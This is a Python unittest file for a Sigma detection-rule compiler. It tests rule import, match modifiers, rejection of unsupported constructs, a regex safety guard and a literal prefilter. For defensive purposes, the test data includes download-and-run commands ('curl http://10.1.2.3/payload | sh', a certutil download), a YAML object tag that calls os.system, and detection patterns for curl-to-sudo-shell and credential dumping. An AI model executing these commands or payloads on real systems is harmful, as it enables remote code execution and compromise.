from __future__ import annotations

# ruff: noqa: E402
#
# Coverage for the Sigma layer: that a real public rule imports verbatim and
# matches, that constructs we cannot execute are refused *by name* instead of
# silently never firing, that the regex guard rejects catastrophic patterns while
# passing the ones real rules use, and that the derived literal prefilter is sound.

import unittest
from types import SimpleNamespace

from app.rules import limits
from app.rules.fieldmap import MatchCtx
from app.rules.safe_regex import UnsafeRegexError, compile_bounded
from app.rules.sigma_compile import (
    SigmaLimitError,
    SigmaRuleError,
    SigmaSyntaxError,
    SigmaUnsupportedError,
    compile_source,
    matches,
)


def _rule(body: str, *, uid: str = "11111111-2222-3333-4444-555555555555") -> str:
    return f"title: Test rule\nid: {uid}\nstatus: test\n{body}\n"


def _process(path: str = r"C:\Windows\System32\cmd.exe", cmdline: str = "", **extra) -> MatchCtx:
    process = SimpleNamespace(
        name=path.rsplit("\\", 1)[-1], path=path, cmdline=cmdline, pid=42, ppid=1,
        extra={},
    )
    return MatchCtx(kind="process", raw=extra, process=process)


def _event(summary: str = "", category: str = "process", source: str = "test", **raw) -> MatchCtx:
    event = SimpleNamespace(
        summary=summary, category=category, source=source, entity=None, host="HOST", id=1
    )
    return MatchCtx(kind="event", raw=raw, event=event)


class PublicRuleTests(unittest.TestCase):
    """A rule in the shape SigmaHQ publishes must work as written."""

    PUBLIC_RULE = """
title: Suspicious Encoded PowerShell Command Line
id: fb843269-508c-4b76-8b8d-88679db22ce7
status: test
description: Detects suspicious encoded PowerShell command lines
references:
    - https://example.invalid/reference
author: Example Author
date: 2024/01/01
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith:
              - '\\powershell.exe'
              - '\\pwsh.exe'
        - OriginalFileName:
              - 'PowerShell.EXE'
    selection_cli:
        CommandLine|contains:
            - ' -enc '
            - ' -ec '
            - ' -encodedcommand '
    filter_main_known_good:
        CommandLine|contains: 'BuildAgentPipeline'
    condition: all of selection_* and not 1 of filter_main_*
falsepositives:
    - Unlikely
level: high
"""

    def setUp(self) -> None:
        (self.rule,) = compile_source(self.PUBLIC_RULE)

    def test_metadata_is_read(self) -> None:
        self.assertEqual(self.rule.title, "Suspicious Encoded PowerShell Command Line")
        self.assertEqual(self.rule.severity, "high")
        self.assertEqual(self.rule.techniques, ("T1059.001",))

    def test_it_matches_the_intended_command_line(self) -> None:
        ctx = _process(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                       "powershell.exe -enc SQBFAFgA")
        self.assertTrue(matches(self.rule, ctx))

    def test_the_filter_branch_excludes_known_good(self) -> None:
        ctx = _process(r"C:\Windows\powershell.exe",
                       "powershell.exe -enc SQBFAFgA BuildAgentPipeline")
        self.assertFalse(matches(self.rule, ctx))

    def test_a_different_binary_does_not_match(self) -> None:
        self.assertFalse(matches(self.rule, _process(cmdline="cmd.exe /c dir")))

    def test_a_literal_prefilter_was_derived(self) -> None:
        self.assertTrue(self.rule.gated)
        self.assertTrue(self.rule.literals)


class ModifierTests(unittest.TestCase):
    def _one(self, detection: str, logsource: str = "    category: process_creation"):
        source = _rule(f"logsource:\n{logsource}\ndetection:\n{detection}\nlevel: medium")
        return compile_source(source)[0]

    def test_contains_startswith_endswith(self) -> None:
        rule = self._one("    sel:\n        CommandLine|contains: 'evilmarker'\n    condition: sel")
        self.assertTrue(matches(rule, _process(cmdline="run evilmarker now")))
        self.assertFalse(matches(rule, _process(cmdline="benign")))

        rule = self._one("    sel:\n        Image|endswith: '\\rundll32.exe'\n    condition: sel")
        self.assertTrue(matches(rule, _process(path=r"C:\Windows\rundll32.exe")))

    def test_all_modifier_requires_every_value(self) -> None:
        rule = self._one(
            "    sel:\n        CommandLine|contains|all:\n"
            "            - 'alpha'\n            - 'bravo'\n    condition: sel"
        )
        self.assertTrue(matches(rule, _process(cmdline="alpha and bravo")))
        self.assertFalse(matches(rule, _process(cmdline="alpha only")))

    def test_windash_expands_to_dash_variants(self) -> None:
        rule = self._one(
            "    sel:\n        CommandLine|windash|contains: '-encodedcommand'\n    condition: sel"
        )
        self.assertTrue(matches(rule, _process(cmdline="powershell /encodedcommand xx")))
        self.assertTrue(matches(rule, _process(cmdline="powershell -encodedcommand xx")))

    def test_cidr_matches_network_membership(self) -> None:
        rule = self._one(
            "    sel:\n        DestinationIp|cidr: '10.0.0.0/8'\n    condition: sel",
            logsource="    category: network_connection",
        )
        self.assertTrue(matches(rule, _event(DestinationIp="10.4.5.6")))
        self.assertFalse(matches(rule, _event(DestinationIp="192.168.1.1")))

    def test_numeric_comparison(self) -> None:
        rule = self._one(
            "    sel:\n        EventID|gte: 4700\n    condition: sel",
            logsource="    product: windows",
        )
        self.assertTrue(matches(rule, _event(EventID="4720")))
        self.assertFalse(matches(rule, _event(EventID="4104")))

    def test_keyword_search_matches_the_whole_subject(self) -> None:
        rule = self._one("    sel:\n        - 'uniquekeyword'\n    condition: sel")
        self.assertTrue(matches(rule, _process(cmdline="something uniquekeyword here")))
        self.assertFalse(matches(rule, _process(cmdline="nothing to see")))


class RejectionTests(unittest.TestCase):
    """Unsupported means refused with the construct named, never silently ignored."""

    def _compile(self, source: str):
        return compile_source(source)

    def test_fieldref_is_named_in_the_error(self) -> None:
        source = _rule(
            "logsource:\n    category: process_creation\ndetection:\n"
            "    sel:\n        CommandLine|fieldref: Image\n    condition: sel\nlevel: low"
        )
        with self.assertRaises(SigmaUnsupportedError) as caught:
            self._compile(source)
        self.assertIn("fieldref", str(caught.exception))

    def test_yaml_anchors_are_refused(self) -> None:
        with self.assertRaises(SigmaLimitError) as caught:
            self._compile("title: T\nid: &anchor x\nother: *anchor\n")
        self.assertIn("anchor", str(caught.exception).lower())

    def test_oversized_source_is_refused(self) -> None:
        with self.assertRaises(SigmaLimitError):
            self._compile("title: T\n" + "x: " + "a" * (limits.MAX_YAML_BYTES + 10))

    def test_malformed_yaml_reports_a_syntax_error(self) -> None:
        with self.assertRaises(SigmaSyntaxError):
            self._compile("title: [unterminated\n")

    def test_empty_source_is_refused(self) -> None:
        with self.assertRaises(SigmaSyntaxError):
            self._compile("   \n")

    def test_a_python_object_tag_is_never_constructed(self) -> None:
        """safe_load must refuse an object tag rather than instantiating anything."""
        with self.assertRaises(SigmaRuleError):
            self._compile("title: !!python/object/apply:os.system ['echo pwned']\n")


class RegexGuardTests(unittest.TestCase):
    def test_patterns_used_by_real_rules_are_accepted(self) -> None:
        for pattern in (
            r"\bmimikatz\b",
            r"foo[0-9]+bar",
            r"\d{1,3}(?:\.\d{1,3}){3}",
            r"(?=.*\blsass\b)(?=.*procdump)",
            r"\b(?:curl|wget)\b[^|;&\n]{0,300}\|\s*sudo\s+(?:-\S+\s+)*(?:ba|z|da|a)?sh\b",
        ):
            with self.subTest(pattern=pattern):
                self.assertIsNotNone(compile_bounded(pattern))

    def test_catastrophic_patterns_are_rejected(self) -> None:
        for pattern in ("(a+)+$", "(a*)*$", "(a|aa)+$", "(x+x+)+y", r"(\d+)*$", "([a-zA-Z]+)*$"):
            with self.subTest(pattern=pattern):
                with self.assertRaises(UnsafeRegexError):
                    compile_bounded(pattern)

    def test_backreferences_are_rejected(self) -> None:
        with self.assertRaises(UnsafeRegexError):
            compile_bounded(r"(abc)\1")

    def test_overlong_patterns_are_rejected(self) -> None:
        with self.assertRaises(UnsafeRegexError):
            compile_bounded("a" * 600)


class PrefilterSoundnessTests(unittest.TestCase):
    """The gate may never drop a subject the rule would have matched.

    Same technique as the existing command-line corpus tests: compare the gated
    decision against the ungated one over a corpus, and assert they never disagree
    in the direction that loses a detection.
    """

    CORPUS = (
        "powershell.exe -enc AAAA",
        "cmd.exe /c whoami",
        "rundll32.exe shell32.dll,Control_RunDLL",
        "curl http://10.1.2.3/payload | sh",
        "alpha and bravo together",
        "alpha alone",
        "nothing interesting at all",
        "certutil -urlcache -f http://x/y z.exe",
        "",
    )

    RULES = (
        "    sel:\n        CommandLine|contains: 'alpha'\n    condition: sel",
        "    sel:\n        CommandLine|contains|all:\n            - 'alpha'\n            - 'bravo'\n    condition: sel",
        "    a:\n        CommandLine|contains: 'powershell'\n    b:\n        CommandLine|contains: 'certutil'\n    condition: a or b",
        "    a:\n        CommandLine|contains: 'cmd.exe'\n    f:\n        CommandLine|contains: 'whoami'\n    condition: a and not f",
        "    sel:\n        CommandLine|re: 'curl\\s+http'\n    condition: sel",
        "    sel:\n        - 'rundll32'\n    condition: sel",
    )

    def test_gate_never_hides_a_match(self) -> None:
        for index, detection in enumerate(self.RULES):
            source = _rule(
                f"logsource:\n    category: process_creation\ndetection:\n{detection}\nlevel: low",
                uid=f"11111111-2222-3333-4444-5555555555{index:02d}",
            )
            rule = compile_source(source)[0]
            for text in self.CORPUS:
                with self.subTest(rule=index, text=text):
                    ctx = _process(cmdline=text)
                    really_matches = rule.predicate(ctx)
                    if not really_matches:
                        continue
                    # If the rule matches, the gate must let it through: either it
                    # has no literals (always evaluated) or one of them is present.
                    gate_passes = not rule.literals or any(
                        literal in ctx.blob() for literal in rule.literals
                    )
                    self.assertTrue(
                        gate_passes,
                        f"prefilter would have hidden a real match for {text!r}",
                    )

    def test_negation_yields_no_literals(self) -> None:
        """A negated branch imposes no positive literal, so it must not be gated."""
        source = _rule(
            "logsource:\n    category: process_creation\ndetection:\n"
            "    sel:\n        CommandLine|contains: 'alpha'\n    condition: not sel\nlevel: low"
        )
        self.assertFalse(compile_source(source)[0].literals)


if __name__ == "__main__":
    unittest.main()
